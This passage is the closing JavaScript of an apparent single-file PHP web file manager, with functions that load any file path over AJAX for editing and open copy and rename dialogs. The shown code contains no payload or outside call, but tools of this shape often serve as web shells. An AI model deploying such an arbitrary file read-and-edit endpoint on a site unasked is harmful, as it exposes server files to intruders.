    document.getElementById('editFilenameDisplay').textContent = filename;
    document.getElementById('editPathDisplay').textContent = path;
    document.getElementById('editFilepath').value = path;
    document.getElementById('editContent').value = '⏳ Loading file content...';
    showModal('editModal');
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '?ajax=read&file=' + encodeURIComponent(path), true);
    xhr.onload = function() {
        if (xhr.status === 200) {
            document.getElementById('editContent').value = xhr.responseText;
        } else {
            document.getElementById('editContent').value = '// Error membaca file (HTTP ' + xhr.status + ')';
        }
    };
    xhr.onerror = function() {
        document.getElementById('editContent').value = '// Network error saat membaca file.';
    };
    xhr.send();
}

function copyItem(name) {
    var currentDir = '<?php echo addslashes($current_dir); ?>';
    document.getElementById('copySrc').value = currentDir + '/' + name;
    document.getElementById('copyDst').value = '';
    setTimeout(function() { document.getElementById('copyDst').focus(); }, 150);
    showModal('copyModal');
}

function renameItem(name) {
    document.getElementById('renameOld').value = name;
    document.getElementById('renameNew').value = '';
    setTimeout(function() { document.getElementById('renameNew').focus(); }, 150);
    showModal('renameModal');
}
</script>

</body>
</html>